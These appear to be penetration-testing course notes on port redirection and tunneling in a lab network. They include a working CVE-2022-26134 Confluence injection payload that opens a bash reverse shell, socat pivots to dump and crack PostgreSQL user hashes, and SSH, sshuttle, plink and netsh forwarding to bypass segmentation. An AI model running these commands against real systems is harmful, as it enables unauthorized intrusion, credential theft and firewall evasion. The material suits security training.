# Port Redirection and Tunneling

## Why Port Redirection and Tunneling?

- Most network environments are segmented, not flat.
- Secure network design follows the **principle of least privilege**.
- Subnets group devices by function and limit unnecessary access.
- Firewalls and routing rules limit traffic flow:
  - Linux: `iptables`
  - Windows: Windows Defender Firewall
- Firewalls drop unwanted inbound packets and block malicious traffic.
- Deep Packet Inspection (DPI) analyzes packet contents to apply rules.
- **Port redirection** and **tunneling** are used to bypass such restrictions.

---

## Port Redirection vs Tunneling

- **Port Redirection**: Redirects packets from one socket to another.
- **Tunneling**: Encapsulates one stream in another (e.g., HTTP in SSH).

---

## Port Forwarding with Linux Tools

### Scenario

- Web server (Confluence) vulnerable to `CVE-2022-26134`.
- Two network interfaces: one on external, one on internal subnet.
- Found internal PostgreSQL IP/port and credentials.
- Target Network Layout:
  ```
  WAN -> DMZ -> PostgreSQL
  ```

### Exploitation Example

```bash
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

Decoded:
```java
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

- Reverse shell received.
- `ip addr` and `ip route` show internal interfaces and routes.
- Credentials found for PostgreSQL, but no client installed.

---

## Port Forwarding with Socat

On DMZ:
```bash
socat -ddd TCP-LISTEN:<port>,fork TCP:<target>:5432
```

From Kali:
```bash
psql -h <DMZ IP> -p <port> -U postgres
```

Once accessed:
```sql
\l
\c confluence
SELECT * FROM cwd_user;
```

Crack passwords with:
```bash
hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt
```

---

## Forward SSH Port with Socat

```bash
socat TCP-LISTEN:2222,fork TCP:<DB>:22
```

Then:
```bash
ssh -p 2222 database_admin@<DMZ>
```

---

## SSH Tunneling

### Local Port Forwarding

```bash
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
```

From Kali:
```bash
smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
```

---

### Dynamic Port Forwarding

```bash
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
```

In `/etc/proxychains4.conf`:
```
socks5 192.168.50.63 9999
```

Use:
```bash
proxychains smbclient ...
sudo proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217
```

---

### Remote Port Forwarding

```bash
ssh -N -R 127.0.0.1:2345:<DB IP>:5432 kali@<Kali IP>
```

---

### Remote Dynamic Port Forwarding

```bash
ssh -N -R 9998 kali@<Kali IP>
```

Configure Proxychains:
```
socks5 127.0.0.1 9998
```

---

## Using `sshuttle`

First:
```bash
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
```

Then:
```bash
sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
```

---

## Windows-Specific Forwarding

### OpenSSH on Windows

```powershell
ssh -N -L ...
```

### Plink

Transfer and run:
```powershell
C:\Windows\Temp\plink.exe -ssh -l kali -pw <pass> -R 127.0.0.1:9833:127.0.0.1:3389 <Kali IP>
```

---

## Netsh Portproxy

```cmd
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=<localip> connectport=<targetport> connectaddress=<targetip>
netstat -anp TCP | find "2222"
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=<localip> localport=2222 action=allow
```

Clean up:
```cmd
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
```